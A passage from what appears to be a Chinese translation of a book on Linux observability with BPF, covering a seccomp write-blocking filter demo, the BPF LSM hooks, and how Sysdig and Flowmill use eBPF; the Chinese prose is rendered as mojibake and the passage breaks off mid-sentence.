class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>install_filter</code>å‡½æ•°ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨å®ƒä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>prctl</code>è®¾ç½®å½“å‰æ‰§è¡Œçš„ PR_SET_NO_NEW_PRIVSä»¥é¿å…å­è¿›ç¨‹å¯ä»¥æ‹¥æœ‰æ¯”çˆ¶è¿›ç¨‹æ›´å¹¿æ³›çš„æƒé™ã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨æ²¡æœ‰rootæƒé™çš„æƒ…å†µä¸‹åœ¨<code>install_filter</code>å‡½æ•°ä¸­è¿›è¡Œ<code>prctl</code>è°ƒç”¨ã€‚</p><p>ç°åœ¨å¯ä»¥è°ƒç”¨<code>install_filter</code>å‡½æ•°ã€‚ æˆ‘ä»¬å°†é˜»æ­¢æ‰€æœ‰ä¸X86-64ä½“ç³»ç»“æ„ç›¸å…³çš„å†™å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶ä¸”åªä¼šæˆäºˆæ‹’ç»æ‰€æœ‰å°è¯•çš„æƒé™ã€‚è¿‡æ»¤å™¨å®‰è£…åï¼Œæˆ‘ä»¬åªéœ€ä½¿ç”¨ç¬¬ä¸€ä¸ªå‚æ•°ç»§ç»­æ‰§è¡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(NO_NEW_PRIVS)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line">  <span class="keyword">return</span> system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç¨‹åºå¯ä»¥ä½¿ç”¨<code>clang</code>æˆ–<code>gcc</code>ï¼› </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang main.c -o filter-write</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å·²ç»é˜»æ­¢äº†ç¨‹åºä¸­çš„æ‰€æœ‰å†™å…¥ã€‚ä¸ºäº†æµ‹è¯•å®ƒï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä»¥å†™çš„ç¨‹åºï¼›<code>ls</code>ä¼¼ä¹æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œä¸‹é¢æ˜¯å®ƒçš„æ­£å¸¸è¿è¡Œæ–¹å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 root root  4096 Jun  4 10:10 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Jun  4 10:09 ..</span><br><span class="line">-rwxr-xr-x 1 root root 17832 Jun  4 10:10 filter-write</span><br><span class="line">-rw-r--r-- 1 root root  1210 Jun  4 10:10 main.c</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬åªéœ€å°†è¦æµ‹è¯•çš„ç¨‹åºä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåè¾“å‡ºä¸ºç©ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>strace</code>æ¥æŸ¥çœ‹å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# strace -f ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹è¾“å‡ºç»“æœå»æ‰äº†å¾ˆå¤šæ— ç”¨çš„è¾“å‡ºï¼Œç›¸å…³éƒ¨åˆ†æ˜¾ç¤ºå†™å…¥è¢«EPERMé”™è¯¯é˜»æ­¢ï¼Œè¿™ä¸æˆ‘ä»¬è®¾ç½®çš„ç›¸åŒã€‚ è¿™æ„å‘³ç€ç¨‹åºæ˜¯æ‰§è¡ŒæˆåŠŸçš„ï¼Œå› ä¸ºå®ƒç°åœ¨æ— æ³•è®¿é—®è¯¥ç³»ç»Ÿè°ƒç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[pid 390331] write(2, "ls: ", 4)        = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "write error", 11) = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "\n", 1)          = -1 EPERM (Operation not permitted)</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä½ å·²ç»äº†è§£äº†Seccomp BPFçš„è¿ä½œæ–¹å¼ä»¥åŠæ‚¨å¯ä»¥ç”¨å®ƒåšä»€ä¹ˆã€‚ ä½†æ˜¯ï¼Œå¦‚æœæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨eBPFè€Œä¸æ˜¯cBPFå®ç°åŒæ ·çš„æ•ˆæœï¼Œé‚£ä¸æ˜¯å¾ˆå¥½å—ï¼Ÿ</p><p>åœ¨è€ƒè™‘eBPFç¨‹åºæ—¶ï¼Œå¤§å¤šæ•°äººè®¤ä¸ºåªæ˜¯ç¼–å†™å®ƒä»¬å¹¶ä»¥rootæƒé™åŠ è½½å®ƒä»¬ã€‚ å°½ç®¡è¿™å¥è¯é€šå¸¸æ˜¯æ­£ç¡®çš„ï¼Œä½†å†…æ ¸å®ç°äº†ä¸€å¥—æœºåˆ¶æ¥ä¿æŠ¤å„ä¸ªçº§åˆ«çš„eBPFå¯¹è±¡ã€‚ è¿™äº›æœºåˆ¶ç§°ä¸ºBPF LSMé’©å­ã€‚</p><h3 id="BPF-LSMé’©å­"><a href="#BPF-LSMé’©å­" class="headerlink" title="BPF LSMé’©å­"></a>BPF LSMé’©å­</h3><p>ä¸ºäº†æä¾›å¯¹ç³»ç»Ÿäº‹ä»¶çš„ç‹¬ç«‹äºä½“ç³»ç»“æ„çš„æ§åˆ¶ï¼ŒLSMå®ç°äº†é’©å­çš„æ¦‚å¿µã€‚ä»æŠ€æœ¯ä¸Šè®²ï¼Œé’©å­è°ƒç”¨ç±»ä¼¼äºç³»ç»Ÿè°ƒç”¨ã€‚ç„¶è€Œï¼Œç‹¬ç«‹äºç³»ç»Ÿå¹¶ä¸LSMæ¡†æ¶é›†æˆä½¿å¾—é’©å­å˜å¾—æœ‰è¶£ï¼Œå› ä¸ºå®ƒæä¾›çš„æŠ½è±¡å±‚å¾ˆæ–¹ä¾¿ï¼Œå¹¶ä¸”å¯ä»¥é¿å…åœ¨ä¸åŒæ¶æ„ä¸Šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ—¶å¯èƒ½å‘ç”Ÿçš„éº»çƒ¦ã€‚</p><p>åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå†…æ ¸æœ‰ä¸ƒä¸ªä¸BPFç¨‹åºç›¸å…³çš„é’©å­ï¼Œè€ŒSELinuxæ˜¯å”¯ä¸€å®ç°å®ƒä»¬çš„in-tree LSMã€‚ä½ å¯ä»¥åœ¨æ­¤æ–‡ä»¶çš„å†…æ ¸æºç ä¸­çœ‹åˆ°è¿™ä¸€ç‚¹ï¼š<code>include/linux/security.h</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">fmode_t</span> fmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog</span><span class="params">(struct bpf_prog *prog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map_alloc</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_map_free</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog_alloc</span><span class="params">(struct bpf_prog_aux *aux)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_prog_free</span><span class="params">(struct bpf_prog_aux *aux)</span></span>;</span><br></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ªé’©å­éƒ½å°†åœ¨æ‰§è¡Œçš„ä¸åŒé˜¶æ®µè¢«è°ƒç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">security_bpfï¼šå¯¹å·²æ‰§è¡Œçš„BPFç³»ç»Ÿè°ƒç”¨è¿›è¡Œåˆå§‹æ£€æŸ¥</span><br><span class="line">security_bpf_mapï¼šæ£€æŸ¥å†…æ ¸ä½•æ—¶è¿”å›æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">security_bpf_progï¼šæ£€æŸ¥å†…æ ¸ä½•æ—¶è¿”å›eBPFç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">security_bpf_map_allocï¼šæ˜¯å¦åˆå§‹åŒ–BPFæ˜ å°„ä¸­çš„å®‰å…¨å­—æ®µ</span><br><span class="line">security_bpf_map_freeï¼šæ˜¯å¦æ¸…ç†BPFæ˜ å°„ä¸­çš„å®‰å…¨å­—æ®µ</span><br><span class="line">security_bpf_prog_allocï¼šæ˜¯å¦åœ¨BPFç¨‹åºä¸­åˆå§‹åŒ–å®‰å…¨å­—æ®µ</span><br><span class="line">security_bpf_prog_freeï¼šæ˜¯å¦æ¸…ç†BPFç¨‹åºä¸­çš„å®‰å…¨å­—æ®µ</span><br></pre></td></tr></table></figure><h3 id="ç»“è®º-3"><a href="#ç»“è®º-3" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>å®‰å…¨æ€§ä¸æ˜¯ä¸€ç§ä»¥é€šç”¨æ–¹å¼ä¸ºä½ æƒ³è¦ä¿æŠ¤çš„æ‰€æœ‰å†…å®¹å®æ–½çš„ä¸œè¥¿ã€‚èƒ½å¤Ÿä»¥ä¸åŒçš„æ–¹å¼åœ¨ä¸åŒçš„å±‚æ¬¡ä¸Šä¿æŠ¤ç³»ç»Ÿæ˜¯å¾ˆé‡è¦çš„ï¼Œä¿æŠ¤ç³»ç»Ÿçš„æœ€å¥½æ–¹æ³•æ˜¯ä»¥ä¸åŒçš„è§†è§’å †å ä¸åŒçš„å±‚ï¼Œè¿™æ ·ä¸€ä¸ªå—æŸçš„å±‚å°±ä¸ä¼šæœ‰èƒ½åŠ›è®¿é—®æ•´ä¸ªç³»ç»Ÿã€‚å†…æ ¸å¼€å‘äººå‘˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç»„ä¸åŒçš„å±‚å’Œäº¤äº’ç‚¹ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½è®©ä½ å¾ˆå¥½åœ°ç†è§£å±‚æ˜¯ä»€ä¹ˆä»¥åŠå¦‚ä½•ä½¿ç”¨BPFç¨‹åºä¸å®ƒä»¬è¿›è¡Œäº¤äº’ã€‚</p><h2 id="ç¬¬ä¹ç« èŠ‚"><a href="#ç¬¬ä¹ç« èŠ‚" class="headerlink" title="ç¬¬ä¹ç« èŠ‚"></a>ç¬¬ä¹ç« èŠ‚</h2><h3 id="Sysdig-eBPF-God-Mode"><a href="#Sysdig-eBPF-God-Mode" class="headerlink" title="Sysdig eBPF God Mode"></a>Sysdig eBPF God Mode</h3><p>åˆ¶ä½œåŒåå¼€æºLinuxæ•…éšœæ’é™¤å·¥å…·çš„å…¬å¸<code>Sysdig</code>äº2017å¹´å¼€å§‹åœ¨å†…æ ¸4.11ä¸‹ä½¿ç”¨eBPFã€‚</p><p>è¿‡å»è¯¥å…¬å¸ä¸€ç›´ä½¿ç”¨å†…æ ¸æ¨¡å—æ¥æå–å’Œå®Œæˆæ‰€æœ‰å†…æ ¸ç«¯å·¥ä½œï¼Œä½†éšç€ç”¨æˆ·ç¾¤çš„å¢åŠ ä»¥åŠè¶Šæ¥è¶Šå¤šçš„å…¬å¸å¼€å§‹è¯•éªŒï¼Œè¯¥å…¬å¸æ‰¿è®¤åœ¨è®¸å¤šæ–¹é¢å¯¹å¤§å¤šæ•°å¤–éƒ¨è¡Œä¸ºæ˜¯ä¸€ç§é™åˆ¶ï¼š</p><ul><li>è¶Šæ¥è¶Šå¤šçš„ç”¨æˆ·æ— æ³•åœ¨ä»–ä»¬çš„æœºå™¨ä¸ŠåŠ è½½å†…æ ¸æ¨¡å—ã€‚ äº‘åŸç”Ÿå¹³å°å¯¹è¿è¡Œæ—¶ç¨‹åºçš„åŠŸèƒ½è¶Šæ¥è¶Šä¸¥æ ¼</li><li>æ–°è´¡çŒ®è€…ï¼ˆç”šè‡³è€è´¡çŒ®è€…ï¼‰ä¸äº†è§£å†…æ ¸æ¨¡å—çš„ä½“ç³»ç»“æ„ã€‚è¿™å‡å°‘äº†è´¡çŒ®è€…çš„æ€»æ•°ï¼Œå¹¶æˆä¸ºäº†é¡¹ç›®æœ¬èº«å‘å±•çš„ä¸€ä¸ªé™åˆ¶å› ç´ </li><li>å†…æ ¸æ¨¡å—çš„ç»´æŠ¤å¾ˆå›°éš¾ï¼Œä¸ä»…ä»…æ˜¯å› ä¸ºç¼–å†™ä»£ç ï¼Œè¿˜éœ€è¦åŠªåŠ›ä¿æŒå®ƒçš„å®‰å…¨å’Œç»„ç»‡è‰¯å¥½</li></ul><p>å‡ºäºè¿™äº›åŠ¨æœºï¼Œ<code>Sysdig</code>å†³å®šå°è¯•ç¼–å†™ä¸æ¨¡å—ä¸­ç›¸åŒçš„ä¸€ç»„åŠŸèƒ½ï¼Œä½†æ”¹ç”¨eBPFç¨‹åºçš„æ–¹æ³•ã€‚ é‡‡ç”¨eBPFè‡ªåŠ¨å¸¦æ¥çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯<code>Sysdig</code>å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨å…¶ä»–ä¸é”™çš„eBPFè·Ÿè¸ªåŠŸèƒ½ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ç”¨æˆ·æ¢é’ˆå°†eBPFç¨‹åºé™„åŠ åˆ°ç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºä¸­çš„ç‰¹å®šæ‰§è¡Œç‚¹ç›¸å¯¹å®¹æ˜“ã€‚</p><p>æ­¤å¤–ï¼Œè¯¥é¡¹ç›®ç°åœ¨å¯ä»¥åœ¨eBPFç¨‹åºä¸­ä½¿ç”¨åŸç”Ÿè¾…åŠ©å‡½æ•°åŠŸèƒ½æ¥æ•è·æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å †æ ˆè·Ÿè¸ªï¼Œä»¥å¢å¼ºå…¸å‹çš„ç³»ç»Ÿè°ƒç”¨äº‹ä»¶æµã€‚ä¸ºç”¨æˆ·æä¾›äº†æ›´å¤šæ•…éšœæ’é™¤ä¿¡æ¯ã€‚</p><p>ç”±äºeBPFè™šæ‹Ÿæœºçš„é™åˆ¶ï¼Œ<code>Sysdig</code>åœ¨å¼€å§‹æœ€åˆé¢ä¸´ä¸€äº›æŒ‘æˆ˜ï¼Œå› æ­¤è¯¥é¡¹ç›®çš„é¦–å¸­æ¶æ„å¸ˆGianluca Borelloå†³å®šé€šè¿‡ä¸ºå†…æ ¸æœ¬èº«æä¾›ä¸Šæ¸¸è¡¥ä¸æ¥æ”¹è¿›å®ƒï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>åŸç”Ÿå¤„ç†eBPFç¨‹åºä¸­çš„å­—ç¬¦ä¸²çš„èƒ½åŠ›</li><li>å¤šä¸ªè¡¥ä¸æ¥æ”¹è¿›eBPFç¨‹åºï¼Œ<a href="!https://patchwork.ozlabs.org/patch/840473/">1</a>,<a href="!https://patchwork.ozlabs.org/patch/840470/">2</a>,<a href="!https://patchwork.ozlabs.org/patch/840471/">3</a></li></ul><p>åè€…å¯¹äºå¤„ç†ç³»ç»Ÿè°ƒç”¨å‚æ•°å°¤å…¶é‡è¦ï¼Œè¿™æˆ–è®¸æ˜¯è¯¥å·¥å…·ä¸­å¯ç”¨çš„æœ€é‡è¦çš„æ•°æ®æºã€‚</p><p>å¦‚ä¸‹æ‰€ç¤ºæ˜¯Sysdigä¸­çš„eBPFæ¶æ„å›¾</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/6.png" alt="6"></p><p>å®ç°çš„æ ¸å¿ƒæ˜¯è´Ÿè´£æ£€æµ‹çš„è‡ªå®šä¹‰eBPFç¨‹åºçš„é›†åˆã€‚ è¿™äº›ç¨‹åºæ˜¯ç”¨Cè¯­è¨€çš„ä¸€ä¸ªå­é›†ç¼–å†™çš„ã€‚ ä»¬æ˜¯ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„<code>Clang</code>å’Œ<code>LLVM</code>ç¼–è¯‘çš„ï¼Œå®ƒä»¬å°†é«˜çº§Cä»£ç è½¬æ¢ä¸ºeBPFå­—èŠ‚ç ã€‚</p><p><code>Sysdig</code>æ£€æµ‹å†…æ ¸çš„æ¯ä¸ªä¸åŒæ‰§è¡Œç‚¹éƒ½æœ‰ä¸€ä¸ªeBPFç¨‹åºã€‚ç›®å‰ï¼ŒeBPFç¨‹åºé™„åŠ åˆ°ä»¥ä¸‹é™æ€è·Ÿè¸ªç‚¹ï¼š</p><ul><li>System call entry path</li><li>System call exit path</li><li>Process context switch</li><li>Process termination</li><li>Minor and major page faults</li><li>Process signal delivery</li></ul><p>æ¯ä¸ªç¨‹åºæ¥æ”¶æ‰§è¡Œç‚¹æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œå¯¹äºç³»ç»Ÿè°ƒç”¨ï¼Œè°ƒç”¨è¿›ç¨‹ä¼ é€’çš„å‚æ•°ï¼‰å¹¶å¼€å§‹å¤„ç†å®ƒä»¬ã€‚ å¤„ç†å–å†³äºç³»ç»Ÿè°ƒç”¨çš„ç±»å‹ã€‚ å¯¹äºç®€å•çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå‚æ•°åªæ˜¯é€å­—å¤åˆ¶åˆ°eBPFæ˜ å°„ä¸­ï¼Œç”¨äºä¸´æ—¶å­˜å‚¨ï¼Œç›´åˆ°å½¢æˆæ•´ä¸ªäº‹ä»¶æ¡†æ¶ã€‚å¯¹äºå…¶ä»–å¤æ‚çš„è°ƒç”¨ï¼ŒeBPFç¨‹åºåŒ…æ‹¬ç¿»è¯‘æˆ–æ‰©å……å‚æ•°çš„é€»è¾‘ã€‚è¿™ä½¿ç”¨æˆ·ç©ºé—´ä¸­çš„<code>Sysdig</code>åº”ç”¨ç¨‹åºèƒ½å¤Ÿå……åˆ†åˆ©ç”¨æ•°æ®ã€‚</p><p>ä¸€äº›é™„åŠ æ•°æ®åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ä¸ç½‘ç»œè¿æ¥ç›¸å…³çš„æ•°æ®ï¼ˆTCP/UDP IPv4/IPv6 å…ƒç»„ã€UNIXå¥—æ¥å­—åç§°ç­‰ï¼‰</li><li>ä¸è¿›ç¨‹ç›¸å…³çš„æŒ‡æ ‡ï¼ˆå†…å­˜è®¡æ•°å™¨ã€é¡µé¢é”™è¯¯ã€å¥—æ¥å­—é˜Ÿåˆ—é•¿åº¦ç­‰ï¼‰</li><li>å®¹å™¨ç‰¹å®šæ•°æ®ï¼Œä¾‹å¦‚å‘å‡ºç³»ç»Ÿè°ƒç”¨çš„è¿›ç¨‹æ‰€å±çš„<code>cgroup</code>ï¼Œä»¥åŠè¿›ç¨‹æ‰€åœ¨çš„å‘½åç©ºé—´</li></ul><p>åœ¨ä¸Šé¢<code>Sysdig</code>çš„eBPFæ¶æ„å›¾ä¸­ï¼ŒeBPFç¨‹åºä¸ºç‰¹å®šç³»ç»Ÿè°ƒç”¨æ•è·æ‰€æœ‰éœ€è¦çš„æ•°æ®åï¼Œä½¿ç”¨ä¸€ä¸ªç‰¹æ®Šçš„æœ¬åœ°BPFå‡½æ•°å°†æ•°æ®æ¨é€åˆ°ä¸€ç»„CPUçš„ç¯å½¢ç¼“å†²åŒºï¼Œç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºå¯ä»¥ä»¥éå¸¸é«˜çš„ååé‡è¯»å–ã€‚ è¿™ä¸åŒäºä½¿ç”¨eBPFæ˜ å°„ä¸ç”¨æˆ·ç©ºé—´å…±äº«å†…æ ¸ç©ºé—´ä¸­ç”Ÿæˆçš„â€œå°æ•°æ®â€çš„å…¸å‹èŒƒä¾‹ã€‚ </p><h3 id="Flowmill"><a href="#Flowmill" class="headerlink" title="Flowmill"></a>Flowmill</h3><p>Flowmillæ˜¯ä¸€å®¶å¯è§‚æµ‹æ€§åˆåˆ›å…¬å¸ï¼Œå…¶åˆ›å§‹äººä¹”çº³æ£®Â·ä½©é‡Œï¼ˆJonathan Perryï¼‰ä»ä¸€ä¸ªåä¸º<code>Flowtune</code>çš„å­¦æœ¯ç ”ç©¶é¡¹ç›®ä¸­è„±é¢–è€Œå‡ºã€‚<code>Flowtune</code>ç ”ç©¶äº†å¦‚ä½•åœ¨æ‹¥å¡çš„æ•°æ®ä¸­å¿ƒç½‘ç»œä¸­æœ‰æ•ˆåœ°è°ƒåº¦å•ä¸ªæ•°æ®åŒ…ã€‚è¿™é¡¹å·¥ä½œæ‰€éœ€çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€æ˜¯ä»¥æä½çš„å¼€é”€æ”¶é›†ç½‘ç»œé¥æµ‹æ•°æ®çš„æ–¹æ³•ã€‚Flowmillæœ€ç»ˆé‡‡ç”¨äº†è¿™é¡¹æŠ€æœ¯æ¥è§‚å¯Ÿã€èšåˆå’Œåˆ†æåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¸­æ¯ä¸ªç»„ä»¶ä¹‹é—´çš„è¿æ¥ï¼Œä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>æä¾›æœåŠ¡å¦‚ä½•åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­äº¤äº’çš„å‡†ç¡®è§†å›¾</li><li>ç»Ÿè®¡æµé‡é€Ÿç‡ã€é”™è¯¯æˆ–å»¶è¿Ÿæ˜¾ç€å˜åŒ–çš„åŒºåŸŸ</li></ul><p>Flowmillä½¿ç”¨eBPFå†…æ ¸æ¢é’ˆæ¥è·Ÿè¸ªæ¯ä¸ªæ‰“å¼€çš„å¥—æ¥å­—å¹¶å®šæœŸæ•è·å®ƒä»¬çš„æ“ä½œç³»ç»ŸæŒ‡æ ‡ã€‚è¿™å¾ˆå¤æ‚ï¼ŒåŸå› æœ‰å¾ˆå¤šï¼š</p><ul><li>åœ¨å»ºç«‹ eBPF æ¢é’ˆæ—¶ï¼Œæœ‰å¿…è¦æ£€æµ‹æ–°è¿æ¥å’Œå·²ç»æ‰“å¼€çš„ç°æœ‰è¿æ¥ã€‚ æ­¤å¤–ï¼Œå®ƒå¿…é¡»è€ƒè™‘åˆ°TCPå’ŒUDPä»¥åŠé€šè¿‡å†…æ ¸çš„IPv4å’ŒIPv6ä»£ç è·¯å¾„ã€‚</li><li>å¯¹äºåŸºäºå®¹å™¨çš„ç³»ç»Ÿï¼Œæ¯ä¸ªå¥—æ¥å­—éƒ½å¿…é¡»å½’å±äºç›¸åº”çš„<code>cgroup</code>ï¼Œå¹¶ä¸æ¥è‡ªKubernetesæˆ–Dockerç­‰å¹³å°çš„ç¼–æ’å™¨å…ƒæ•°æ®ç›¸ç»“åˆã€‚</li><li>å¿…é¡»å¯¹é€šè¿‡<code>conntrack</code>æ‰§è¡Œçš„ç½‘ç»œåœ°å€è½¬æ¢è¿›è¡Œæ£€æµ‹ï¼Œä»¥å»ºç«‹å¥—æ¥å­—ä¸å…¶å¤–éƒ¨å¯è§IPåœ°å€ä¹‹é—´çš„æ˜ å°„ã€‚ ä¾‹å¦‚ï¼Œåœ¨Dockerä¸­ï¼Œå¸¸è§çš„ç½‘ç»œæ¨¡å‹ä½¿ç”¨æºNATæ¥ä¼ªè£…ä¸»æœºIPåœ°å€å’ŒKubernetesåé¢çš„å®¹å™¨ï¼Œå¹¶ä½¿ç”¨æœåŠ¡è™šæ‹ŸIPåœ°å€æ¥è¡¨ç¤ºä¸€ç»„å®¹å™¨ã€‚</li><li>eBPFç¨‹åºæ”¶é›†çš„æ•°æ®å¿…é¡»ç»è¿‡åå¤„ç†ï¼Œä»¥æŒ‰æœåŠ¡æä¾›èšåˆå¹¶åŒ¹é…åœ¨è¿æ¥ä¸¤ä¾§æ”¶é›†çš„æ•°æ®ã€‚</li></ul><p>ç„¶è€Œï¼Œæ·»åŠ eBPFå†…æ ¸æ¢é’ˆæä¾›äº†ä¸€ç§æ›´æœ‰æ•ˆå’Œæ›´å¼ºå¤§çš„æ–¹å¼æ¥æ”¶é›†è¿™äº›æ•°æ®ã€‚å®ƒæ¶ˆé™¤äº†ä¸¢å¤±è¿æ¥çš„é£é™©ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ç§’çº§é—´éš”å†…ä»¥ä½å¼€é”€åœ¨æ¯ä¸ªå¥—æ¥å­—ä¸Šå®Œæˆã€‚Flowmillçš„æ–¹æ³•ä¾èµ–ä¸€ä¸ªä»£ç†ï¼Œè¯¥ä»£ç†ç»“åˆäº†ä¸€ç»„eBPF kprobeså’Œç”¨æˆ·ç©ºé—´æŒ‡æ ‡æ”¶é›†ä»¥åŠæœºå¤–èšåˆå’Œåå¤„ç†ã€‚è¯¥å®ç°å¤§é‡ä½¿ç”¨Perfç¯å°†åœ¨æ¯ä¸ªå¥—æ¥å­—ä¸Šæ”¶é›†çš„æŒ‡æ ‡ä¼ é€’åˆ°ç”¨æˆ·ç©ºé—´ä»¥åšè¿›ä¸€æ­¥å¤„ç†ã€‚æ­¤å¤–ï¼Œå®ƒä½¿ç”¨å“ˆå¸Œæ˜ å°„æ¥è·Ÿè¸ªæ‰“å¼€çš„TCPå’ŒUDPå¥—æ¥å­—ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>tcp_v4_do_rcv</code>æ•è·æ‰€æœ‰å·²å»ºç«‹çš„TCP RXæµé‡å¹¶å¯ä»¥è®¿é—®<code>struct sock</code>ï¼Œä½†è°ƒç”¨é‡éå¸¸å¤§ã€‚ç›¸åï¼Œç”¨æˆ·å¯ä»¥æ£€æµ‹å¤„ç†ACKã€ä¹±åºæ•°æ®åŒ…å¤„ç†ã€RTTé¢„æµ‹ç­‰åŠŸèƒ½ï¼Œä»è€Œå…è®¸å¤„ç†å½±å“å·²çŸ¥æŒ‡æ 